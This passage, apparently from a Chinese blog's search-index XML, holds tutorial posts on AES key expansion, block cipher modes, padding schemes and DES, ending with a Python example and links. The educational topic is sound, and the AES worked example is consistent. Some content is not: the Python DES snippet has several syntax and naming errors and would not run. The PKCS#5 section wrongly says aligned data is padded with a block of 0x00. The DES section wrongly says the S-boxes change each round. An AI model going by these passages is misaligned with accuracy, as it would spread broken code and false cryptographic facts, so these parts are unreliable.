b3]变换成[b1,b2,b3,b0]。<br>b.字节代换：对字循环的结果使用S盒进行字节代换。<br>c.轮常量异或：将前两步的结果同轮常量Rcon[j]进行异或，其中j表示轮数。<br>轮常量Rcon[j]是一个字，其值见下表。</p><table><thead><tr><th>j</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th></tr></thead><tbody><tr><td>Rcon[j]</td><td>01 00 00 00</td><td>02 00 00 00</td><td>04 00 00 00</td><td>08 00 00 00</td><td>10 00 00 00</td></tr><tr><td>j</td><td>6</td><td>7</td><td>8</td><td>9</td><td>10</td></tr><tr><td>Rcon[j]</td><td>20 00 00 00</td><td>40 00 00 00</td><td>80 00 00 00</td><td>1B 00 00 00</td><td>36 00 00 00</td></tr></tbody></table><p>下面举个例子：<br>设初始的128位密钥为：<br>3C A1 0B 21 57 F0 19 16 90 2E 13 80 AC C1 07 BD<br>那么4个初始值为：<br>W[0] &#x3D; 3C A1 0B 21<br>W[1] &#x3D; 57 F0 19 16<br>W[2] &#x3D; 90 2E 13 80<br>W[3] &#x3D; AC C1 07 BD<br>下面求扩展的第1轮的子密钥(W[4],W[5],W[6],W[7])。<br>由于4是4的倍数，所以：<br>W[4] &#x3D; W[0] ⨁ T(W[3])<br>T(W[3])的计算步骤如下：<br>\1. 循环地将W[3]的元素移位：AC C1 07 BD变成C1 07 BD AC;<br>\2. 将 C1 07 BD AC 作为S盒的输入，输出为78 C5 7A 91;<br>\3. 将78 C5 7A 91与第一轮轮常量Rcon[1]进行异或运算，将得到79 C5 7A 91，因此，T(W[3])&#x3D;79 C5 7A 91，故<br>W[4] &#x3D; 3C A1 0B 21 ⨁ 79 C5 7A 91 &#x3D; 45 64 71 B0<br>其余的3个子密钥段的计算如下：<br>W[5] &#x3D; W[1] ⨁ W[4] &#x3D; 57 F0 19 16 ⨁ 45 64 71 B0 &#x3D; 12 94 68 A6<br>W[6] &#x3D; W[2] ⨁ W[5] &#x3D;90 2E 13 80 ⨁ 12 94 68 A6 &#x3D; 82 BA 7B 26<br>W[7] &#x3D; W[3] ⨁ W[6] &#x3D; AC C1 07 BD ⨁ 82 BA 7B 26 &#x3D; 2E 7B 7C 9B<br>所以，第一轮的密钥为 45 64 71 B0 12 94 68 A6 82 BA 7B 26 2E 7B 7C 9B。</p><h2 id="AES解密"><a href="#AES解密" class="headerlink" title="AES解密"></a>AES解密</h2><p>在文章开始的图中，有AES解密的流程图，可以对应那个流程图来进行解密。下面介绍的是另一种等价的解密模式，流程图如下图所示。这种等价的解密模式使得解密过程各个变换的使用顺序同加密过程的顺序一致，只是用逆变换取代原来的变换。 </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406181122127.png" alt="image-20240618112217093"> </p><h1 id="AES算法特征"><a href="#AES算法特征" class="headerlink" title="AES算法特征"></a>AES算法特征</h1><p>算法加密步骤：</p><ul><li>根据输入的密钥选定使用哪种AES算法（AES-128、AES-192、AES-256）</li><li>密钥扩展（具体步骤参考上面 “轮密钥加”中）假设使用AES-128，则扩展后的 len(w) &#x3D; 44【4*(轮数+1)】</li><li>上面的是初始化操作，具体执行加密流程如下：</li><li>①对输入的明文进行分组，经过得到一个4*4的明文矩阵</li><li>②轮密钥加：将128位轮密钥同明文矩阵中的数据进行逐位异或操作，这块的轮密钥使用的是w[0,3]</li><li>下面开始第一轮运算，运算步骤如下：</li><li>①字节代换：将明文数据和S盒进行替换，和之前的DES一样</li><li>②行移位：将替换后的矩阵循环左移，是第几行就左移几位（第0行不移，第1行移1位……）</li><li>③列混合：进行矩阵相乘，将数据进行一个混淆（主要和数学相关）</li><li>④轮密钥加：将128位轮密钥Ki同状态矩阵中的数据进行逐位异或操作</li><li>这样就完成了一轮运算，AES-128是需要完成10轮这样的运算。。。</li></ul><p>整个过程使用图表示如下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406181122289.png" alt="img"> </p>]]></content>
      
      
      <categories>
          
          <category> 算法还原 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法还原 </tag>
            
            <tag> AES </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法还原之对称加密模式及填充</title>
      <link href="/2024/06/17/%E7%AE%97%E6%B3%95%E8%BF%98%E5%8E%9F%E4%B9%8B%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F%E5%8F%8A%E5%A1%AB%E5%85%85/"/>
      <url>/2024/06/17/%E7%AE%97%E6%B3%95%E8%BF%98%E5%8E%9F%E4%B9%8B%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F%E5%8F%8A%E5%A1%AB%E5%85%85/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="一-前言"><a href="#一-前言" class="headerlink" title="一 前言"></a>一 前言</h1><p>根据上节课DES的加密流程，利用CyberChef来测试</p><p>会发现除了输入plainText 和 key之外，还需要选择模式Mode和偏移量iv：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171713786.png" alt="image.png"> </p><p>上面是ECB模式，默认可以不输入iv，但是将Mode修改为CBC后，就会报错。要求必须输入iv的值</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171723835.png" alt="image.png"> </p><p>根据上节课的原理，要求输入的明文必须为64位&#x2F;64位的倍数。但是这块将输入调整为 “1234567”，56位，发现也是可以正常加密的</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171724655.png" alt="image.png"> </p><p>这块是因为当输入明文不满足64位的倍数的时候，会对明文的长度进行填充。。。</p><h1 id="二-加密模式"><a href="#二-加密模式" class="headerlink" title="二 加密模式"></a>二 加密模式</h1><p>加密模式可以简单理解为，在加密前&#x2F;加密后，对用户的输入&#x2F;输出进行处理。分组密码常见的加密方式主要有5种：</p><ul><li>ECB：电子密码本模式（不需要传入iv）</li><li>CBC：密码块链接模式</li><li>CFB：密文反馈模式</li><li>OFB：输出反馈模式</li><li>CTR：计数器模式</li></ul><p>明文分组是指分组密码算法中作为加密对象的明文。明文分组的长度与分组密码算法的分组长度是相等的。<br>密文分组是指使用分组密码算法将明文分组加密之后所生成的密文。</p><h2 id="ECB模式"><a href="#ECB模式" class="headerlink" title="ECB模式"></a>ECB模式</h2><p>在ECB模式中，将明文分组加密之后的结果将直接成为密文分组。</p><p><strong>ECB模式的加密：</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171725324.png" alt="img"> </p><p><strong>ECB模式的界面：</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171725956.png" alt="img"> </p><p>ECB模式中，明文分组和密文分组是一一对应的关系，因此，如果明文中存在多个相同的明文分组，则这些明文分组最终将被转换为相同的密文分组。</p><p>整个过程不需要iv参与。<br>安全性低，易攻击。</p><h2 id="CBC模式"><a href="#CBC模式" class="headerlink" title="CBC模式"></a>CBC模式</h2><p>CBC模式的密文分组像链条一样相互连接在一起。</p><p>在CBC模式中，首先将明文分组与<strong>前一个密文分组</strong>进行XOR运算，然后再进行加密。</p><p><strong>CBC模式的加密</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171729374.png" alt="img"> </p><p><strong>CBC模式的解密</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171729261.png" alt="img"> </p><p><strong>初始化向量</strong></p><p>当加密第一个明文分组时，由于不存在“前一个密文分组”，因此需要事先准备一个长度为一个分组的比特序列来代替“前一个密文分组”，这个比特序列称为<strong>初始化向量</strong>，通常缩写为<strong>IV</strong>。一般来说，每次加密时都会随机产生一个不同的比特序列来作为初始化向量。</p><ul><li>假设CBC模式加密的密文分组中有一个<strong>分组损坏</strong>了，例如由于硬盘故障导致密文分组的值发生了改变等，这种情况下，只要密文分组的长度没有发生变化，则解密时最多只会有2个分组收到数据损坏的影响。</li><li>假设CBC模式加密的密文分组中有一些<strong>比特缺失</strong>了，例如由于通信错误导致没有收到某些比特等，那么此时即使缺失1比特，也会导致密文分组的长度发生变化，此后的分组发生错位，这样一来，缺失比特的位置之后的密文分组也就全部无法解密。</li></ul><p><strong>填充提示攻击</strong>是一种利用分组密码中的填充部分来进行攻击的方法。在分组密码中，当明文长度不为分组长度的整倍数时，需要在最后一个分组中填充一些数据使其凑满一个分组长度。在填充提示攻击中，攻击者会反复发送一段密文，每次发送时都对填充的数据进行少许改变。由于接收者（服务器)在无法正确解密时会返回一个错误消息，攻击者通过这一错误消息就可以获得一部分与明文相关的消息。这一攻击模式并不仅限于CBC模式，而是适用于所有需要进行分组填充的模式。</p><h2 id="CFB模式"><a href="#CFB模式" class="headerlink" title="CFB模式"></a>CFB模式</h2><p>在CFB模式中，前一个密文分组会被送回到密码算法的输入端。所谓反馈，这里指的就是返回输入端的意思。</p><p><strong>CFB模式的加密</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171730108.png" alt="img"> </p><p><strong>CFB模式的解密</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171730189.png" alt="img"> </p><p>在ECB模式和CBC模式中，明文分组都是通过密码算法进行加密的，但在CFB模式中，明文分组并没有通过密码算法来直接进行加密。在CFB模式中，明文分组和密文分组之间只有一个XOR。</p><p>在生成第一个密文分组时，由于不存在前一个输出的数据，因此需要使用<strong>初始化向量</strong>（<strong>IV</strong>）来代替，与CBC模式相同。</p><h2 id="OFB模式"><a href="#OFB模式" class="headerlink" title="OFB模式"></a>OFB模式</h2><p>在OFB模式中，密码算法的输出会反馈到密码算法的输入中。<br>OFB模式并不是通过密码算法对明文直接进行加密的，而是通过将“明文分组”和“密码算法的输出”进行XOR来产生“密文分组”的，这点与CFB模式相似。</p><p><strong>OFB模式的加密</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171731529.png" alt="img"> </p><p><strong>OFB模式的解密</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171730456.png" alt="img"> </p><p>OFB模式和CFB模式的区别仅仅在于密码算法的输入。<br>CFB模式中，密码算法的输入是前一个密文分组，也就是将密文分组反馈到密码算法中，因此被称为“密文反馈模式”；<br>OFB模式中，密码算法的输入是密码算法的前一个输出，也就是将输出反馈给密码算法，因此被称为“输出反馈模式”。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171730459.png" alt="img"> </p><h2 id="CTR模式"><a href="#CTR模式" class="headerlink" title="CTR模式"></a>CTR模式</h2><p>CTR模式是一种通过将逐次累加的计数器进行加密来生成密钥流的流密码。最终的密文分组是通过将计数器加密的到的比特序列，与明文分组进行XOR而得到的。</p><p><strong>CTR模式的加密</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171732989.png" alt="img"> </p><p><strong>CTR模式的解密</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171732012.png" alt="img"> </p><p>计数器的生成方法，前8个字节为nonce，这个值在每次加密时必须时不同的。后8个字节为分组序号，这个部分逐次累加。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171732965.png" alt="img"> </p><p><strong>OFB模式与CTR模式的对比</strong></p><ul><li>两者都是流密码。</li><li>OFB模式是将加密的输出反馈到输入，CTR模式是将计数器的值用作输入。</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171733292.png" alt="img"> </p><p><strong>CTR模式的特点：</strong><br>CTR模式的加密华为解密使用了完全相同的结构；可以以任意顺序对分组进行加密和解密；可以实现并行计算；在支持并行计算的系统中，CTR模式速度非常快。</p><h2 id="分组密码模式比较表"><a href="#分组密码模式比较表" class="headerlink" title="分组密码模式比较表"></a>分组密码模式比较表</h2><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171733185.png" alt="img"> </p><h1 id="三-填充方式"><a href="#三-填充方式" class="headerlink" title="三 填充方式"></a>三 填充方式</h1><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171734942.png" alt="image.png"> </p><p>正常按照DES算法来说，输入一个8个字节的明文字符串，输出的也应该是一个8个字节密文的。但很显然，在cyberchef中输出了18位的内容。</p><p>这个是什么原因呢？？？？</p><p>还有一个，DES算法要求输入的明文必须为64位&#x2F;64位的倍数。但是这块将输入调整为 “1234567”，7个字节，发现也是可以正常加密的，并且输出密文长度为8个字节：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171734781.png" alt="image.png"> </p><p>这块又是什么原因呢？？？</p><p>分组密码中，需要将明文按指定大小进行分组，由于明文并非指定大小的整数倍，因此在明文的最后一个分组需要将其填充至加密算法所要求的分组大小后进行加密。</p><p>在解密时，按照同样的填充模式将填充的数据去除。常见的填充方式有以下6种：</p><ul><li>NoPadding</li><li>PKCS#5</li><li>PKCS#7</li><li>ISO 10126</li><li>ANSI X9.23</li><li>ZerosPadding</li></ul><h2 id="NoPadding"><a href="#NoPadding" class="headerlink" title="NoPadding"></a>NoPadding</h2><p>不填充，在此填充下原始数据必须是分组大小的整数倍，非整数倍时无法使用该模式</p><h2 id="PKCS-5"><a href="#PKCS-5" class="headerlink" title="PKCS#5"></a>PKCS#5</h2><p>填充至符合块大小的整数倍，填充值为填充数量数（缺几个字节就填几个缺的字节数）</p><ul><li>原始：FF FF FF FF FF FF FF FF FF</li><li>填充：FF FF FF FF FF FF FF FF FF 07 07 07 07 07 07 07</li></ul><p>比如这块原始长度为9个字节，确少7个字节为8的倍数，则填充值为 “07”</p><p>【注意】如果数据不缺省，也需要填充一个块长度的 0x00，如下所示：</p><ul><li>原始：FF FF FF FF FF FF FF FF </li><li>填充：FF FF FF FF FF FF FF FF 00 00 00 00 00 00 00 00</li></ul><p>目的：为了更明确哪些内容是原始数据，哪些是填充的。如果有16个字节的原文为FF FF FF FF FF FF FF FF FF FF FF FF FF 03 03 03 ,那这块的03就不能区分是原始数据部分还是填充部分了。</p><p>如果填充了一个块长度的 0x00，就可以明确此处的03为原始数据部分。</p><h2 id="PKCS-7"><a href="#PKCS-7" class="headerlink" title="PKCS#7"></a>PKCS#7</h2><p>缺几个字节就填充几个缺的字节数（255  bytes）</p><p>如果数据缺省，也需要填充一个块长度的0x08</p><p>【注意】在AES加密当中严格来说是不能使用pkcs5的，因为<strong>AES</strong>的块大小是 16bytes 而PKCS#5只能用于8 bytes。通常在AES中所说的PKCS#5就是PKCS#7</p><h2 id="ISO-10126Padding"><a href="#ISO-10126Padding" class="headerlink" title="ISO 10126Padding"></a>ISO 10126Padding</h2><p>填充至符合块大小的整数倍，填充值最后一个字节为填充的数量数，其他字节随机处理</p><ul><li>原始：FF FF FF FF FF FF FF FF FF</li><li>填充：FF FF FF FF FF FF FF FF FF 3F 7A B4 09 14 36 07</li></ul><h2 id="ANSI-X9-23"><a href="#ANSI-X9-23" class="headerlink" title="ANSI X9.23"></a>ANSI X9.23</h2><p>填充至符合块大小的整数倍，填充值最后一个字节为填充的数量数，其他字节填 0</p><ul><li>原始：FF FF FF FF FF FF FF FF FF</li><li>填充：FF FF FF FF FF FF FF FF FF 00 00 00 00 00 00 07</li></ul><h2 id="ZeroByte-Padding"><a href="#ZeroByte-Padding" class="headerlink" title="ZeroByte Padding"></a>ZeroByte Padding</h2><p>填充至符合块大小的整数倍，填充值为 0</p><ul><li>原始：FF FF FF FF FF FF FF FF FF</li><li>填充：FF FF FF FF FF FF FF FF FF 00 00 00 00 00 00 00</li></ul><p>如果已经是128bit的倍数，仍需要填充。  </p>]]></content>
      
      
      <categories>
          
          <category> 算法还原 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 对称加密 </tag>
            
            <tag> 加密模式 </tag>
            
            <tag> 填充 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法还原之DES</title>
      <link href="/2024/06/17/%E7%AE%97%E6%B3%95%E8%BF%98%E5%8E%9F%E4%B9%8BDES/"/>
      <url>/2024/06/17/%E7%AE%97%E6%B3%95%E8%BF%98%E5%8E%9F%E4%B9%8BDES/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="一-DES原理介绍"><a href="#一-DES原理介绍" class="headerlink" title="一 DES原理介绍"></a>一 DES原理介绍</h1><p>可以参考下面这篇文章，讲解的很详细：</p><p><a href="https://blog.csdn.net/Demonslzh/article/details/129129493">https://blog.csdn.net/Demonslzh/article/details/129129493</a></p><p>DES算法采用分组密码，将明文分成64位一组，密钥长度为56位。其基本原理是通过一系列的置换、替换和异或运算，利用密钥对数据进行加密和解密。</p><ul><li>DES为对称加密算法</li><li>DES还是一种分组加密算法，算法每次处理固定长度的数据段，称之为分组</li><li>DES算法过程的关键是从给定的初始密钥中得到16个子密钥的函数</li><li>要加密一组明文，每个子密钥按照顺序(1-16)以一系列的位操作施加于数据上，每个子密钥一次，一共重复16次</li><li>DES算法的分组大小是64位，因此，如果需要加密的明文长度<strong>不足64位</strong>，需要进行<strong>填充</strong>；如果明文长度<strong>超过64位</strong>，则需要使用分组模式进行<strong>分组加密</strong>。</li><li>虽然DES算法的<strong>分组大小是64位</strong>，但是由于DES算法的<strong>密钥长度只有56位</strong>。</li></ul><h2 id="子密钥k的生成"><a href="#子密钥k的生成" class="headerlink" title="子密钥k的生成"></a>子密钥k的生成</h2><p>DES算法采用了每轮子密钥生成的方式来增加密钥的复杂性和安全性。每轮子密钥都是由主密钥（64位）通过密钥调度算法（Key Schedule Algorithm）生成的。DES算法的密钥调度算法可以将64位的主密钥分成16个子密钥，每个子密钥48位，用于每轮加密中与输入数据进行异或运算。</p><p>通过子密钥生成的流程图来看下整个过程。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171631431.png" alt="img"> </p><p>1、将64位主密钥经过置换选择1（Permuted Choice 1简写为PC-1）后输出了56位，将其分为左右两个28位的数据块，分别记为C0和D0。同上面我们讲过的置换规则一样，PC-1置换函数也是一个固定的置换表。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171632968.png" alt="img"> </p><p>从PC-1的置换表中可以看到，舍弃掉的8位数据是原始数据中<strong>每8位数据的最后一位</strong>，也就是我们所熟知的奇偶检验位。这8位被丢弃是因为它们对于密钥的安全性没有贡献，而且能够使DES算法的计算速度更快。</p><p>【举例】</p><p>假设我们输入的64位初始密钥对应字符串 “12345678”</p><p>则K(64) &#x3D; 0011000100110010001100110011010000110101001101100011011100111000</p><p>这块对初始的k进行变换：</p><ul><li>第一位为第57位：0</li><li>第二位为第49位：0</li><li>第三位为第41位：1</li><li>……</li></ul><p>2、对C0和D0进行<strong>循环左移</strong>操作。循环左移完成后生成C1和D1。因此，在16个轮次的计算当中会得到16个32位的数据块C1-C16和D1-D16。在DES中循环左移也有<strong>固定的规则</strong>。</p><p>对于i&#x3D;1，2，…，16，对于Ci和Di，若i为1，2，9或16，则循环左移一位，否则循环左移两位。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171637802.png" alt="image.png"> </p><p>3、对于C1，D1，将它们经过置换选择2(Permuted Choice 2 简写位PC-2）后，得到48位的子密钥K1，用于每轮加密中与输入数据进行异或运算。PC-2置换的输入是由PC-1置换生成的56位的密钥，而它的输出是48位的子密钥。PC-2置换将56位的密钥重新排列，丢弃了8位并选取了其中的48位作为子密钥。PC-2的置换规则如下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171637897.png" alt="image.png"> </p><p>即PC-2置换表的第一行表示选择了输入密钥中的第14、17、11、24、1和5位，并将它们作为输出子密钥的前6位。以此类推…</p><p>4、至此，经过PC-2后的结果就是我们当前轮次的子密钥K1了。在整个DES加密过程中会生成16个48位<strong>子密钥K1-K16</strong>，分别用于DES算法中的16轮加密过程，从而保证每轮加密所使用的密钥都是不同的，增加了破解的难度。</p><h2 id="DES加密流程"><a href="#DES加密流程" class="headerlink" title="DES加密流程"></a>DES加密流程</h2><p>当输入了一条64位的数据之后，DES将通过以下步骤进行加密。在第4部分中，我们对每个流程进行详解。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171641222.png" alt="img"> </p><p>1、初始置换（IP置换）：将输入的64位明文块进行置换和重新排列，生成新的64位数据块。</p><p>2、加密轮次：DES加密算法共有16个轮次，每个轮次都包括四个步骤：</p><ul><li>将64位数据块分为左右两个32位块。</li><li>右侧32位块作为输入，经过扩展、异或、置换等操作生成一个48位的数据块。这个48位的数据块被称为“轮密钥”，它是根据加密算法的主密钥生成的子密钥。</li><li>将左侧32位块和轮密钥进行异或运算，结果作为新的右侧32位块。</li><li>将右侧32位块与原来的左侧32位块进行连接，生成一个新的64位数据块，作为下一轮的输入。</li></ul><p>3、末置换（FP置换）：在最后一个轮次完成后，将经过加密的数据块进行置换和重新排列，得到加密后的64位密文。</p><h2 id="DES算法步骤详解"><a href="#DES算法步骤详解" class="headerlink" title="DES算法步骤详解"></a>DES算法步骤详解</h2><h3 id="初始置换-Initial-Permutation，IP置换"><a href="#初始置换-Initial-Permutation，IP置换" class="headerlink" title="初始置换(Initial Permutation，IP置换)"></a>初始置换(Initial Permutation，IP置换)</h3><p>IP置换是将输入的64位明文块进行置换和重新排列，生成新的64位数据块。</p><p><strong>目的</strong>:增加加密的混乱程度，使明文中的每一位都能够对后面的加密过程产生影响，提高加密强度。</p><p>我们将把64位的顺序按下表中规定的顺序放置，图中的数字是在64位明文中每个比特的索引位置。<strong>注意，在DES中，这个置放规则是固定的</strong>。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171644541.png" alt="img"> </p><p>即将原来位于第58个位置的数据放在第1个位置，原来位于第50个位置的元素放在第2个位置，第42个放在第3个，34-&gt;4以此类推…</p><p>初始置换的逆置换（Final Permutation，FP置换）是将加密后的数据块进行置换和重新排列，得到最终的加密结果，与初始置换相对应。</p><h3 id="加密轮次"><a href="#加密轮次" class="headerlink" title="加密轮次"></a>加密轮次</h3><p>初始置换完成后，明文被划分成了相同长度（32位）的左右两部分，记作L0,R0。接下来就会进行16个轮次的加密了。<br>我们从单独一个轮次来看。首先把目光聚焦在R0这里。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171649981.png" alt="img"> </p><p>右半部分R0会作为下一轮次的左半部分L1的输入。其次，R0会补位到48位和本轮次生成的48位K0(马上讲K0的生成)输入到F轮函数中去。F函数的输出结果为32位，结果<strong>F(R0,K0)<strong>会和</strong>L0</strong>进行异或运算作为下一轮次右半部分R1的输入。</p><p>以此类推，重复16轮运算。所以，上面描述的过程可以用以下公式表述。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171649887.png" alt="img"> </p><h3 id="F轮函数"><a href="#F轮函数" class="headerlink" title="F轮函数"></a>F轮函数</h3><h4 id="扩展运算：扩展R到48位"><a href="#扩展运算：扩展R到48位" class="headerlink" title="扩展运算：扩展R到48位"></a>扩展运算：扩展R到48位</h4><p>将32位的R0右半部分进行扩展，得到一个48位的数据块。同样的，数据拓展也是根据一个<strong>固定</strong>的置换表。红框中就是我们要补位的数据。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171656499.png" alt="img"> </p><p>由此可见，扩展过程的每一位都是根据上述的置换表从输入的32位数据块中提取出来的。原始数据的第32位被补充到了新增列的第一个，第5位被补充到了第二个新增列的第一个，以此类推…</p><h4 id="子密钥生成"><a href="#子密钥生成" class="headerlink" title="子密钥生成"></a>子密钥生成</h4><p>参考上面第一部分：子密钥K的生成</p><h4 id="当前轮次的子密钥与拓展的48位R进行异或运算"><a href="#当前轮次的子密钥与拓展的48位R进行异或运算" class="headerlink" title="当前轮次的子密钥与拓展的48位R进行异或运算"></a>当前轮次的子密钥与拓展的48位R进行异或运算</h4><p>当前轮次的子密钥Ki与拓展的48位Ri进行异或运算。运算结果会作为接下来S盒替换的输入</p><h4 id="S盒替换（Substitution-Box-substitution）"><a href="#S盒替换（Substitution-Box-substitution）" class="headerlink" title="S盒替换（Substitution Box substitution）"></a>S盒替换（Substitution Box substitution）</h4><p>S盒替换（Substitution Box substitution）是一种在密码学中广泛使用的加密技术。它是将明文中的一组比特映射到密文中的一组比特的过程，用于增强密码的安全性。DES中S盒替换用于将上一轮异或运算的48位结果映射到32位输出中去。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171657656.png" alt="img"> </p><p>同样的，S盒也是一种置换表。在DES的每一轮计算中S盒都是不一样的。这里我以第一轮计算中的S盒为例。从上图中我们看到，S盒内部有8个S块，记作S1-S8。每个S块都会接收6位字符作为输入并输出四位字符。这里我们以第一个S盒S1为例。他是一个4*16的置换表。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171657689.png" alt="img"> </p><p>例如输入101010到S1中。S1会将这六位的第一位和第六位拿出来10作为S1的行，中间四位0101拿出来作为S1的列。我们转换成十进制，此时映射到这个S盒的位置就是(2,5)对应S盒的<strong>第3行第6列</strong>（索引都从0开始数）。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171657133.png" alt="img"> </p><p>所以这个输入的结果是6，将6转化为二进制110，S盒的输出是4位，所以得S(101010)&#x3D;0110</p><p>因此，可以看到S盒其实是一种非线性的加密技术，它能够抵御许多传统的密码分析攻击，如差分攻击和线性攻击。</p><h4 id="P盒替换"><a href="#P盒替换" class="headerlink" title="P盒替换"></a>P盒替换</h4><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171658744.png" alt="img"> </p><p>P盒替换将S盒替换的32位输出作为输入，经过上述固定的替换表进行替换后即为最后F轮函数的结果。</p><p><strong>该结果F(R0,K0)与L0进行异或运算得到下一轮的右半部分R1</strong></p><h3 id="逆置换"><a href="#逆置换" class="headerlink" title="逆置换"></a>逆置换</h3><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171658935.png" alt="img"> </p><p>在经过16轮次计算后，DES会对最后的结果进行最后一次置换。即为最后的输出结果。</p><h1 id="二-DES算法优缺点"><a href="#二-DES算法优缺点" class="headerlink" title="二 DES算法优缺点"></a>二 DES算法优缺点</h1><p>【优点】</p><p>安全性高：DES算法使用密钥进行加密和解密，相同的明文使用不同的密钥加密后得到的密文是不同的。密钥越长，加密的安全性就越高。</p><p>算法简单：DES算法的加密和解密过程非简单，基于对称加密，使用相同的key进行加解密。</p><p>适用广泛：DES算法是最早也是最广泛使用的加密算法之一，被广泛应用于电子商务、电子邮件、虚拟私人网络等领域，具有广泛的适用性和可移植性。</p><p>【缺点】</p><p>密钥长度较短：DES算法使用56位密钥，虽然在当时足够安全，但在当前计算机的处理能力下，已经不足以保证加密的安全性，易受到暴力破解攻击。</p><p>无法抵抗差分密码分析攻击：DES算法无法抵抗差分密码分析攻击，这种攻击可以通过比较相同明文的密文，分析加密算法的行为并推断出密钥。</p><p>比较慢：由于DES算法是一种分组密码算法，需要对64位的明文进行加密，加密速度比较慢，不适用于对大量数据进行实时加密和解密。</p><h1 id="三-DES算法实现"><a href="#三-DES算法实现" class="headerlink" title="三 DES算法实现"></a>三 DES算法实现</h1><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"></span><br><span class="line"><span class="comment">#将密钥转换为8字节长的二进制数据</span></span><br><span class="line">key = <span class="string">b&#x27;mysecret&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建DES加密器对象</span></span><br><span class="line">cipher = DES.new(key, DES.MODE ECB)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 明文数据</span></span><br><span class="line">plaintext = <span class="string">b&#x27;This is a secret message.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用PKCS7填充对明文进行填充</span></span><br><span class="line">padded_plaintext = pad(plaintext, DEs.block size, style<span class="string">&#x27;pkcs7&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密明文数据</span></span><br><span class="line">ciphertext = cipher.encrypt (padded plaintext)</span><br><span class="line"><span class="comment"># 输出加密后的数据</span></span><br><span class="line"><span class="built_in">print</span> (ciphertext)</span><br></pre></td></tr></table></figure><h2 id="C实现"><a href="#C实现" class="headerlink" title="C实现"></a>C实现</h2><p><a href="https://github.com/dhuertas/DES/blob/master/des.c">https://github.com/dhuertas/DES/blob/master/des.c</a></p><h2 id="Python不依赖外部库的DES算法实现"><a href="#Python不依赖外部库的DES算法实现" class="headerlink" title="Python不依赖外部库的DES算法实现"></a>Python不依赖外部库的DES算法实现</h2><p><a href="https://www.cnblogs.com/wangyanzhong123/p/10575739.html">https://www.cnblogs.com/wangyanzhong123/p/10575739.html</a></p><p><a href="https://github.com/foreverhza/DES-python">https://github.com/foreverhza/DES-python</a></p>]]></content>
      
      
      <categories>
          
          <category> 算法还原 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法还原 </tag>
            
            <tag> DES </tag>
            
            <tag> 对称加密算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法还原之哈希算法总结</title>
      <link href="/2024/06/17/%E7%AE%97%E6%B3%95%E8%BF%98%E5%8E%9F%E4%B9%8B%E5%93%88%E5%B8%8C%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93/"/>
      <url>/2024/06/17/%E7%AE%97%E6%B3%95%E8%BF%98%E5%8E%9F%E4%B9%8B%E5%93%88%E5%B8%8C%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93/</url>
      
